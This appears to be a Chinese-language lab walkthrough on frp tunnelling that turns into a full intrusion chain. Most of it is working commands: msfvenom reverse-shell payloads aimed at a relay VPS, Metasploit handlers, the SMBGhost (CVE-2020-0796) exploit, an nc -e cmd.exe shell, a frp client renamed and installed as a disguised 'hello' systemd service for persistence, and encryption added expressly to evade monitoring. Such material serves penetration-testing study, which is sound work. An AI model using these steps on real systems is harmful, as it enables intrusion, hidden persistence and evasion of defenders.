## 1 服务端

在服务端开放入站端口 7000 和 6000

![在服务端开放入站端口 7000 (1)](./../../../images/Frp/%E5%9C%A8%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%BC%80%E6%94%BE%E5%85%A5%E7%AB%99%E7%AB%AF%E5%8F%A3%207000%20(1).png)

![在服务端开放入站端口 7000 (2)](./../../../images/Frp/%E5%9C%A8%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%BC%80%E6%94%BE%E5%85%A5%E7%AB%99%E7%AB%AF%E5%8F%A3%207000%20(2).png)

![在服务端开放入站端口 7000 (3)](./../../../images/Frp/%E5%9C%A8%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%BC%80%E6%94%BE%E5%85%A5%E7%AB%99%E7%AB%AF%E5%8F%A3%207000%20(3).png)

![在服务端开放入站端口 7000 (4)](./../../../images/Frp/%E5%9C%A8%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%BC%80%E6%94%BE%E5%85%A5%E7%AB%99%E7%AB%AF%E5%8F%A3%207000%20(4).png)

![在服务端开放入站端口 7000 (5)](./../../../images/Frp/%E5%9C%A8%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%BC%80%E6%94%BE%E5%85%A5%E7%AB%99%E7%AB%AF%E5%8F%A3%207000%20(5).png)

在服务端解压

![](./../../../images/Frp/%E5%9C%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E5%8E%8B.png)

> frpc 是客户端文件
>
> frps 是服务端文件

| 文件          | 描述               |
| ------------- | ------------------ |
| frpc          | 客户端程序         |
| frpc_full.ini | 客户端完整配置文件 |
| frpc.ini      | 客户端简易配置文件 |
| frps          | 服务端程序         |
| frps_full.ini | 服务端完整配置文件 |
| frps.ini      | 服务端简易配置文件 |

用记事本打开 frpc.ini 配置服务端

```
[common]
bind_port = 7000        “与客户端绑定Frp的端口”
```

cmd 进入当前目录

```
C:\Users\windows>cd C:\Users\windows\Desktop\frp_0.49.0_windows_amd64
```

运行 frps

```
C:\Users\windows\Desktop\frp_0.49.0_windows_amd64>frps.exe -c ./frps.ini
```

> 提示 `frps started successfully` 则服务启动成功

## 2 客户端

在客户端解压

```
[root@CentOS-76 ~]# tar xf frp_0.49.0_linux_amd64.tar.gz
```

修改客户端配置文件

```
[root@CentOS-76 frp_0.49.0_linux_amd64]# vim frpc.ini
```

![](./../../../images/Frp/%E4%BF%AE%E6%94%B9%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6.png)

> 改 server_addr 为服务端 IP
>
> 改 local_ip 为客户端 IP

运行 frpc

```
[root@CentOS-76 frp_0.49.0_linux_amd64]# ./frpc -c frpc.ini
```

## 3 连接

SSH 连接

```
┌──(root㉿Kali-24)-[~]
└─# ssh root@192.168.6.112 -p 6000
```

若有不同的客户端映射到过服务端的同一个端口，需要清一下密码记录

```
┌──(root㉿Kali-24)-[~]
└─# ssh-keygen -f " /root/.ssh/known_hosts"-R “[192.168.6.112]:6000"
```

查看与服务端的连接

```
[root@CentOS-76 ~]# w
```

## 4 配置 Frp 仪表盘和认证

打开 frps.ini

| 服务端[common] |
| :------------: |

| 名称                          | 描述             |
| ----------------------------- | ---------------- |
| bind_port = 7000              | 服务端 Frp 端口  |
| vhost_http_port = 80          | 公开的客户端端口 |
| dashboard_port = 7500         | 仪表盘端口       |
| dashboard_user = admin        | 仪表盘用户名     |
| dashboard_pwd = admin         | 仪表盘密码       |
| authentication_method = token | 使用 token 认证  |
| token =tN[,n:A4vVT:CexOk_6    | token            |

| 客户端[common] |
| :------------: |

| 名称                        | 描述            |
| --------------------------- | --------------- |
| server_addr = 192.168.6.112 | 服务端 IP       |
| server_port = 7000          | 服务端 Frp 端口 |
| token = tN[,n:A4vVT:CexOk_6 | token           |

| 客户端[web] |
| :---------: |

| 名称                           | 描述                                                       |
| ------------------------------ | ---------------------------------------------------------- |
| type = http                    | 协议                                                       |
| local_port = 80                | 开放的客户端端口                                           |
| custom_domains = 192.168.6.112 | 指定 VPS IP，通过服务端 IP 访问内网 web 服务（可用域名）。 |

在 Kali 访问：`http://192.168.6.112`

> 记得在客户端开启 Web 服务
>
> 安装 `# yum install httpd httpd-devel`
>
> 启动 `# systemctl start httpd.service`

访问仪表盘：`http://192.168.6.112:7500`

5 配置 Frp 接收 shell

修改客户端配置文件

```
┌──(root㉿Kali-24)-[~/frp_0.49.0_linux_amd64]
└─# vim frpc.ini
```

| 客户端[msf] |
| :---------: |

| 名称                    | 描述       |
| ----------------------- | ---------- |
| type = tcp              | 协议       |
| local_port = 4444       | 客户端端口 |
| local_ip = 192.168.6.24 | 客户端 IP  |
| remote_port = 8000      | 服务端端口 |

启动客户端

```
┌──(root㉿Kali-24)-[~/frp_0.49.0_linux_amd64]
└─# ./frpc -c frpc.ini
```

生成 Payload

```
┌──(root㉿Kali-24)-[~]
└─# msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.6.112 LPORT=8000 -b "\x00" -f elf -o hello
```

发送至目标

```
┌──(root㉿Kali-24)-[~]
└─# scp hello root@192.168.6.76:/root/
```

配置 msf

```
┌──(root㉿Kali-24)-[~]
└─# msfdb run
```

```
msf6 > use exploit/multi/handler
```

```
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
```

```
msf6 exploit(multi/handler) > set LHOST 192.168.6.24
```

```
msf6 exploit(multi/handler) > set LPORT 4444
```

在目标执行 Payload

```
[root@CentOS-76 ~]# chmod +x hello
```

```
[root@CentOS-76 ~]# ./hello
```

> 执行后客户端成功拿到目标 shell

## 6 通过 Frp 实现跨网段获取内网 shell

实验环境

![](./../../../images/Frp/%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83.png)

> 环境说明：
>
> DMZ 主机可以是 Win 也可以是 Linux。区别在于 win10 可以通过 CVE-2020-0796 永恒之黑获取 shell，Linux 则推荐生成 payload 直接运行

| 实例                                         | 描述                                                         |
| -------------------------------------------- | ------------------------------------------------------------ |
| Kali<br/>192.168.1.53                        | 桥接模式<br />192.168.1.24                                   |
| Vps<br />39.105.143.115                      | 123.56.167.168                                               |
| CentOS<br />192.168.1.63<br />192.168.110.63 | 桥接模式<br />192.168.6.76<br />仅主机模式<br />192.168.4.76 |
| Windows<br />192.168.110.57                  | 仅主机模式<br />192.168.4.103                                |

> Centos 映射 socks5 代理到 VPS：9999 端口使 Kali（攻击者）可访问内网 4 网段

### 6.1 入侵 DMZ

配置 frp 服务端

```
[root@AliVPS frp_0.49.0_linux_amd64]# vim frps.ini
```

```
[common]
bind_port = 7000
authentication_method = token
token = tN[,n|:A4vVT:CexOk_6
```

启动服务端

```
[root@AliVPS frp_0.49.0_linux_amd64]# ./frps -c frps.ini
```

配置 kali-frp 客户端，用于接收 shell

```
┌──(root㉿Kali-24)-[~/frp_0.49.0_linux_amd64]
└─# vim frpc.ini
```

```
[common]
server_addr = 123.56.167.168
server_port = 7000
token = tN[,n|:A4vVT:CexOk_6

[msf]
type = tcp
local_port = 4444
local_ip = 192.168.6.24
remote_port = 8000
```

启动客户端

```
┌──(root㉿Kali-24)-[~/frp_0.49.0_linux_amd64]
└─# ./frpc -c frpc.ini
```

生成 Payload

```
┌──(root㉿Kali-24)-[~]
└─# msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=123.56.167.168 LPORT=8000 -b "\x00" -f elf -o hello-pub
```

上传到目标

```
┌──(root㉿Kali-24)-[~]
└─# scp hello-pub root@192.168.6.76:/root/ 
```

配置侦听

```
┌──(root㉿Kali-24)-[~]
└─# msfdb run
```

```
msf6 > use exploit/multi/handler
```

```
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
```

```
msf6 exploit(multi/handler) > set LHOST 192.168.6.24
```

```
msf6 exploit(multi/handler) > set LPORT 4444
```

```
msf6 exploit(multi/handler) > run
```

运行 payload

```
[root@CentOS-76 ~]# chmod +x hello-pub 
[root@CentOS-76 ~]# ./hello-pub
```

> 最终得到 shell

查看网段

```
meterpreter > route
```

> 发现有两个网段

### 6.2 在 DMZ 配置 Frp

开启 Web 服务

```
┌──(root㉿Kali-24)-[~]
└─# systemctl start apache2.service
```

将 frp 拷贝到站点根目录

```
┌──(root㉿Kali-24)-[~]
└─# cp frp_0.49.0_linux_amd64.tar.gz /var/www/html/
```

进入目标机 shell

```
meterpreter > shell
```

切换到  tmp 目录

```
meterpreter > cd /tmp
```

> 防删除目录，避免被发现

下载 frp 客户端

```
wget http://192.168.6.24/frp_0.49.0_linux_amd64.tar.gz
```

解压 frp 安装包

```
tar xf frp_0.49.0_linux_amd64.tar.gz
```

退出 shell

```
exit
```

进入 /tmp/frp_0.49.0_linux_amd64/

```
meterpreter > cd /tmp/frp_0.49.0_linux_amd64/
```

打开 frpc.ini

```
meterpreter > edit frpc.ini
```

配置 frpc.ini

```
[common]
server_addr = 123.56.167.168
server_port = 7000
token = tN[,n|:A4vVT:CexOk_6

[socks9999]
type = tcp
remote_port = 9999
plugin = socks5
use_encryption = true
use_compression = true
```

| 操作                   | 描述             |
| ---------------------- | ---------------- |
| plugin = socks5        | 指定 socks5 插件 |
| use_encryption = true  | 启用加密         |
| use_compression = true | 启用压缩         |

> 启用加密和压缩可以防止流量被一些态势感知系统识别。但是还是可以看得到数据来源。

配置 frpc 客户端自启动，并更改名称

> 也可隐藏进程

```
meterpreter > mv frpc /usr/bin/hello
```

建立配置文件目录

```
meterpreter > mkdir /tmp/hello
```

> 尽量隐蔽

移动配置文件到新目录

```
meterpreter > mv frp_0.49.0_linux_amd64 /tmp/hello/
```

配置 frp 服务

```
meterpreter > edit /etc/systemd/system/hello
```

```
[Unit]
Description=Hello Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/hello -c /tmp/hello/frpc.ini
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

进入 shell ，重新加载 systemd 配置

```
meterpreter > shell
sudo systemctl daemon-reload
```

启动 frpc

```
chmod +x /usr/bin/hello
```

```
systemctl start hello.service
```

查看状态

```
systemctl status hello.service
```

开机自启动

```
systemctl enable hello.service
```

### 6.3 配置代理入侵内网

打开配置文件

```
┌──(root㉿Kali-24)-[~]
└─# vim /etc/proxychains4.conf
```

注释 socks4 ，并在下方插入 socks

```
#socks4				127.0.0.1 9050
socks5				123.56.167.168 9999
```

用 nmap 扫描 DMZ 内网网段

```
┌──(root㉿Kali-24)-[~]
└─# proxychains nmap -Pn -sT -p 445 192.168.4.0/24
```

>-Pn：绕过防火墙，进行非 ping 扫描；
>-sT：TCP connect 扫描，全连接扫描。

通过代理启动 msf

```
┌──(root㉿Kali-24)-[~]
└─# proxychains4 msfdb run
```

加载  exploit

```
msf6 > use exploit/windows/smb/cve_2020_0796_smbghost
```

代理访问内网 payload 选择 bind 模式（正向连接）

```
msf6 exploit(windows/smb/cve_2020_0796_smbghost) > set payload windows/x64/meterpreter/bind_tcp
```

```
msf6 exploit(windows/smb/cve_2020_0796_smbghost) > set rhosts 192.168.4.103
```

```
msf6 exploit(windows/smb/cve_2020_0796_smbghost) > set lport 19988
```

```
msf6 exploit(windows/smb/cve_2020_0796_smbghost) > set DefangedMode false
```

```
msf6 exploit(windows/smb/cve_2020_0796_smbghost) > run
```

> 得到 shell

### 6.4 二级代理

实验环境

| 实例                                             | 描述                                                         |
| ------------------------------------------------ | ------------------------------------------------------------ |
| Kali<br/>192.168.1.53                            | 桥接模式<br />192.168.1.24                                   |
| Vps<br />39.105.143.115                          | 123.56.167.168                                               |
| CentOS<br />192.168.1.63<br />192.168.110.63     | 桥接模式<br />192.168.6.76<br />仅主机模式<br />192.168.4.76 |
| Windows-1<br />192.168.110.57<br />192.168.88.57 | 仅主机模式<br />192.168.4.103<br />192.168.9.103             |
| Windows-2<br />192.168.88.58                     | 仅主机模式<br />192.168.9.102                                |

> Centos 映射 socks5 代理到 VPS：9999 端口使 Kali（攻击者）可访问内网 4 网段
>
> Win10-1 映射 socks5 代理到 Centos：8888 端口，使 Kali（攻击者）可访问 9 网段
>
> Kali 通过 VPS 9999 端口访问 4 然后通过 8888 端口访问 9 网段资源。攻击 192.168.9.102

在 Windows-1 查看 IP

```
meterpreter > route
```

>发现还有 192.168.9.1 网段

配置 Centos Frps

```
[root@CentOS-76 hello]# vim frps.ini
```

```
[common]
bind_port = 7000
```

启动 Centos Frps

```
[root@CentOS-76 hello]# ./frps -c /tmp/hello/frps.ini
```

配置 Windows Frpc

```
[common]
server_addr = 192.168.4.76
server_port = 7000

[socks5_8888]
type = tcp
remote_port = 8888
plugin = socks5
use_encryption = true
use_compression = true
```

启动 Windows Frpc

```
C:\Users\windows\Desktop\frp_0.49.0_windows_amd64>frpc.exe -c frpc.ini
```

配置二级代理

```
┌──(root㉿Kali-24)-[~]
└─# vim /etc/proxychains4.conf
```

在最下方配置新的代理

```
socks5 123.56.167.168 9999
socks5 192.168.4.76 8888
```

> 注意顺序不能颠倒。

扫描 Windows-2 端口

```
┌──(root㉿Kali-24)-[~]
└─# nmap -Pn -sT -p 445 192.168.9.102
```

> 成功代理，可对 Windows-2 渗透。

拿到 shell 后将 nc.exe上传到 Windows-2

```
meterpreter > upload /usr/share/windows-binaries/nc.exe c:\\
```

> 通常 frp 内网穿透用 nc 做实验会比较方便一些，msf 利用的话有一些不可控因素，比如 exp 是否执行成功。无法通过 MSF 验证的建议使用 nc

> Kali 中 nc 位置：/usr/share/windows-binaries/nc.exe

在 Windows-2 运行 nc 侦听 443 端口

```
C:\Users\windows>nc -Ldp 443 -e cmd.exe
```

基于代理连接

```
┌──(root㉿Kali-24)-[~]
└─# proxychains4 nc -v 192.168.9.102 443
```

> 成功拿到 shell

---

References

- [Frp](https://gofrp.org/)
